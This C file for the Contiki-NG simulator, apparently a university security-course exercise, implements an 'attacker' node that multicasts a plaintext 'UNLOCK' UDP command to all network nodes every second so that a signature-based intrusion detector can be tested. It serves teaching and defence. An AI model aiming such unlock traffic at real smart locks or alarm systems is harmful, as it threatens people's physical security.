
/*
 * attacker-unlock.c
 *
 * Attack Scenario 3 - Unauthorized Command Injection
 *
 * What this attack does:
 * Sends UNLOCK commands to all IoT devices on the network
 * attempting to gain unauthorized physical control.
 * In a real smart home this would unlock smart door locks,
 * disable security systems, or override safety controls.
 * This is the most physically dangerous attack in the
 * simulation as it directly threatens physical security.
 *
 * Detection type: SIGNATURE-BASED (immediate)
 * No legitimate IoT device sends UNLOCK to entire network
 * Triggers on the very first packet received
 *
 * MITRE T1059 - Command and Scripting Interpreter
 *
 * Author: Anam Sabah Khan - G202402840
 * SEC 619 Term 252
 */

#include "contiki.h"
#include "net/ipv6/simple-udp.h"
#include "net/ipv6/uip.h"
#include "sys/log.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>

#define LOG_MODULE "ATTACKER"
#define LOG_LEVEL  LOG_LEVEL_INFO

#define UDP_CLIENT_PORT   8765
#define UDP_SERVER_PORT   5678

/*
 * Send one UNLOCK command every 1 second
 * Detection is immediate - no threshold
 * Represents attacker attempting unauthorized
 * device control at regular intervals
 */
#define SEND_INTERVAL  (CLOCK_SECOND)

static struct simple_udp_connection udp_conn;
static struct etimer               periodic_timer;
static uip_ipaddr_t                dest_ipaddr;

static uint32_t tx_count = 0;
static uint32_t rx_count = 0;

/*---------------------------------------------------------------------------*/
static void
udp_rx_callback(struct simple_udp_connection *c,
                const uip_ipaddr_t *sender_addr,
                uint16_t sender_port,
                const uip_ipaddr_t *receiver_addr,
                uint16_t receiver_port,
                const uint8_t *data,
                uint16_t datalen)
{
  rx_count++;
  LOG_INFO("RECEIVED response '%.*s' from ",
           datalen, (const char *)data);
  LOG_INFO_6ADDR(sender_addr);
  LOG_INFO_(" (Tx=%" PRIu32 " Rx=%" PRIu32 ")\n",
            tx_count, rx_count);
}

/*---------------------------------------------------------------------------*/
PROCESS(attacker_unlock_process, "Attacker UNLOCK (multicast)");
AUTOSTART_PROCESSES(&attacker_unlock_process);

PROCESS_THREAD(attacker_unlock_process, ev, data)
{
  static char msg[64];

  PROCESS_BEGIN();

  LOG_INFO("=== Attacker (Command Injection) started ===\n");
  LOG_INFO("Attack type: Unauthorized Command Injection\n");
  LOG_INFO("Detection: SIGNATURE-BASED (immediate)\n");
  LOG_INFO("MITRE: T1059 - Command and Scripting Interpreter\n");
  LOG_INFO("Target: ff02::1 (all-nodes multicast)\n");
  LOG_INFO("WARNING: UNLOCK command targets physical security\n");

  simple_udp_register(&udp_conn,
                      UDP_CLIENT_PORT,
                      NULL,
                      UDP_SERVER_PORT,
                      udp_rx_callback);

  uip_create_linklocal_allnodes_mcast(&dest_ipaddr);

  etimer_set(&periodic_timer, SEND_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));

    snprintf(msg, sizeof(msg), "UNLOCK %" PRIu32, tx_count);

    LOG_INFO("Sending '%s' to ff02::1 "
             "(Tx=%" PRIu32 " Rx=%" PRIu32 ")\n",
             msg, tx_count, rx_count);

    simple_udp_sendto(&udp_conn, msg, strlen(msg),
                      &dest_ipaddr);
    tx_count++;
    etimer_reset(&periodic_timer);
  }

  PROCESS_END();
}
